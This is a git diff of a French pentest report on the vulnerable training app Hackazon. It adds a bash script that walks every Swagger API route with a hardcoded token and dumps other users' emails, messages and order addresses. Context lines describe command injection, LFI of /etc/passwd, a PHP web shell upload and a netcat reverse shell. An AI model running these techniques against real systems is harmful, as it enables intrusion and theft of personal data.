@@ -348,7 +348,7 @@ lors de la création du compte
 
 🔍 Exploitation d’un compte via l’analyse du Swagger
  
- ![alt text](image-1.png)
+ ![alt text](src/image-1.png)
 
  Grace au fichiers Swagger on connait la route du backend api pour s'authentifier '/api/auth/'
  
@@ -528,16 +528,93 @@ for id in $(seq 2 100); do
 done
 ```
 
-On peut également utiliser ceci pour modifier les orders,et les paniers soit 3 failles IDOR via le meme script BASH : 
+On peut également utiliser ceci pour modifier les orders,et les paniers soit 3 failles IDOR via ce script BASH : 
+
+```bash
+curl -s "https://hackazon.trackflaw.com//swagger.json" -o /tmp/swagger.json
 
 
+jq -r '.paths | keys[]' /tmp/swagger.json | while read p; do
+    url="https://hackazon.trackflaw.com/${p}"
+    echo "Checking $url"
+    curl -s -H "Authorization: Token 313e860e4d45d91f8261661db4d520bd46b8b00b" "$url" | egrep -i '"username"|"email"|"customer_id"'
+done
+```
 
+
+```bash
+Checking https://hackazon.trackflaw.com/api/auth
+Checking https://hackazon.trackflaw.com/api/cart/my
+{"id":"9","created_at":"2025-10-09 18:36:16","updated_at":"2025-10-09 16:36:16","items_count":"0","items_qty":"0","total_price":0,"uid":"fce320e2beed59cc1b70c82bc69dc9e5","customer_id":"0","customer_email":null,"customer_is_guest":"0","payment_method":null,"shipping_method":null,"shipping_address_id":"0","billing_address_id":"0","last_step":"0","items":[]}
+
+Checking https://hackazon.trackflaw.com/api/cart/{cart_id}
+Checking https://hackazon.trackflaw.com/api/cartItems
+Checking https://hackazon.trackflaw.com/api/category
+Checking https://hackazon.trackflaw.com/api/contactMessages
+{"data":[
+  {"id":"1","created_at":"2025-10-09 12:30:24","name":null,"email":null,"phone":null,"message":null,"customer_id":null},
+  {"id":"2","created_at":"2025-10-09 12:38:58","name":"Hello","email":"hello@hello.com","phone":"716273827","message":"<script>...", "customer_id":"8"},
+  {"id":"3","created_at":"2025-10-09 12:39:38","name":"Hello","email":"hello@hello.com","phone":"716273827","message":"<script>alert(\"1337\");</script>...", "customer_id":"8"},
+  {"id":"4","created_at":"2025-10-09 12:39:46","name":null,"email":null,"phone":null,"message":null,"customer_id":"17"},
+  {"id":"5","created_at":"2025-10-09 12:54:42","name":"a","email":"A@test.com","phone":"a","message":"<h1>test</h1>","customer_id":"5"},
+  {"id":"6","created_at":"2025-10-09 13:29:16","name":"jdoe","email":"momotest@test.com","phone":"t","message":"aefzdsfd","customer_id":"12"}
+],
+"page":1,
+"page_url":"/api/contact_messages?page=1",
+"first_page":1,
+"first_page_url":"/api/contact_messages?page=1",
+"last_page":1,
+"last_page_url":"/api/contact_messages?page=1",
+"total_items":6,
+"pages":1,
+"per_page":10
+}
+
+Checking https://hackazon.trackflaw.com/api/customerAddress
+Checking https://hackazon.trackflaw.com/api/order
+Checking https://hackazon.trackflaw.com/api/order/{order_id}
+Checking https://hackazon.trackflaw.com/api/orderAddresses
+{"data":[
+  {"id":"13","full_name":"Vasya Petrov","address_line_1":"Star street, 666","city":"Inkograd","region":"Buryatia","zip":"666666","country_id":"RU","phone":"","customer_id":"2","address_type":"shipping","order_id":"7"},
+  {"id":"14","full_name":"Vasya Petrov","address_line_1":"Star street, 666","city":"Inkograd","region":"Buryatia","zip":"666666","country_id":"RU","phone":"","customer_id":"2","address_type":"billing","order_id":"7"},
+  {"id":"15","full_name":"Nikita","address_line_1":"Minnaya, 10","city":"Moskow","region":"Moscow","zip":"123456","country_id":"RU","phone":"","customer_id":"1","address_type":"shipping","order_id":"8"},
+  {"id":"16","full_name":"Nikita","address_line_1":"Minnaya, 10","city":"Moskow","region":"Moscow","zip":"123456","country_id":"RU","phone":"","customer_id":"1","address_type":"billing","order_id":"8"},
+  {"id":"17","full_name":"Nikita","address_line_1":"Minnaya, 10","city":"Moskow","region":"Moscow","zip":"123456","country_id":"RU","phone":"","customer_id":"1","address_type":"shipping","order_id":"9"},
+  {"id":"18","full_name":"Nikita","address_line_1":"Minnaya, 10","city":"Moskow","region":"Moscow","zip":"123456","country_id":"RU","phone":"","customer_id":"1","address_type":"billing","order_id":"9"},
+  {"id":"19","full_name":"Nikita","address_line_1":"Minnaya, 10","city":"Moskow","region":"Moscow","zip":"123456","country_id":"RU","phone":"","customer_id":"1","address_type":"shipping","order_id":"10"},
+  {"id":"20","full_name":"Nikita","address_line_1":"Minnaya, 10","city":"Moskow","region":"Moscow","zip":"123456","country_id":"RU","phone":"","customer_id":"1","address_type":"billing","order_id":"10"},
+  {"id":"21","full_name":"Momotest","address_line_1":"Rue de l'esgi","city":"Paris","region":"Paris Région","zip":"75012","country_id":"RU","phone":"607121184","customer_id":"12","address_type":"shipping","order_id":"11"},
+  {"id":"22","full_name":"Momotest","address_line_1":"Rue de l'esgi","city":"Paris","region":"Paris Région","zip":"75012","country_id":"RU","phone":"607121184","customer_id":"12","address_type":"billing","order_id":"11"}
+],
+"page":1,
+"page_url":"/api/order_address?page=1",
+"first_page":1,
+"first_page_url":"/api/order_address?page=1",
+"last_page":1,
+"last_page_url":"/api/order_address?page=1",
+"next_page":2,
+"next_page_url":"/api/order_address?page=2",
+"total_items":16,
+"pages":2,
+"per_page":10
+}
+
+Checking https://hackazon.trackflaw.com/api/orderItems
+Checking https://hackazon.trackflaw.com/api/product
+Checking https://hackazon.trackflaw.com/api/product/{product_id}
+Checking https://hackazon.trackflaw.com/api/user/me
+{"id":"21","username":"zindar","first_name":"","last_name":"","user_phone":null,"email":"rr1@gmail.com","oauth_provider":null,"oauth_uid":null,"created_on":"2025-10-09 17:12:27","last_login":"2025-10-09 17:12:27","active":"1","photo":null,"photoUrl":null}
+
+Checking https://hackazon.trackflaw.com/api/user/{user_id}
+
+```
+
+On peut ici voir les messages des autres utilisateurs sur la page contact on peut voir que de nombreux utilisateurs on tenté d'exploiter une faille XSS et aussi les adresse de commande des autres users .
 Conséquences :
 
 - Usurpation d’identité : un utilisateur malveillant peut se faire passer pour un autre.
 - Perturbation massive : tous les comptes peuvent être désactivés ("active": "0"), rendant le service inutilisable.
-- Exfiltration ou destruction de données personnelles.
-- Accès potentiel à des comptes administrateurs.
+- Exfiltration ou destruction de données personnelles sensibles.
 
 ##### Compromision du compte Jdoe
 
@@ -672,15 +749,15 @@ ici la vulérabilité est critique car un user qui n'est meme pas connecté peut
 
 sur la page 
 
-![alt text](image-2.png)
+![alt text](src/image-2.png)
 
 on peut voir dans l'url un **terms.html**
 si on remplace ce dernier par une commande avec un point virgule au début
-![alt text](image-4.png)
+![alt text](src/image-4.png)
 on peut injecter des commandes 
 ###### LFI
 
-![alt text](image-3.png)
+![alt text](src/image-3.png)
 
 Le paramètre `page` utilisé dans l’URL suivante : **https://hackazon.trackflaw.com/account/help_articles?page=/etc/passwd%00**
 
@@ -703,7 +780,7 @@ On met le caractère `%00` (null byte) pour faire une **troncation d'extension**
 ###### Depot de fichier
 En allant sur la page profile pour éditer on a la possibilité d'upload une image 
 
-![alt text](image-5.png)
+![alt text](src/image-5.png)
 
 seulement il n'y a pas de fonctionnalité de check de type de fichiers on peut donc lui soummetre un shell php sans problèmes comme celui ci
 ```php
@@ -728,10 +805,10 @@ seulement il n'y a pas de fonctionnalité de check de type de fichiers on peut d
 
 apres l'upload en inspectant l'élément de notre image on voit le chemi ici **/user_pictures/ae/zebi.php**
 
-![alt text](image-6.png)
+![alt text](src/image-6.png)
 
 On peut par la suite via notre shell y mettre des commandes : 
-![alt text](image-7.png)
+![alt text](src/image-7.png)
 
 on peut meme y mettre un reverse shell grace a netcat pour avoir un accès complet avec l'user **www-data**
 
@@ -741,11 +818,11 @@ on peut meme y mettre un reverse shell grace a netcat pour avoir un accès compl
 
 ##### Redirection Libre 
 
-![alt text](image-8.png)
+![alt text](src/image-8.png)
 
 dés qu'on se connecte : 
 
-![alt text](image-9.png)
+![alt text](src/image-9.png)
 
 ##### 2. Configuration et mécanismes de déploiement
 
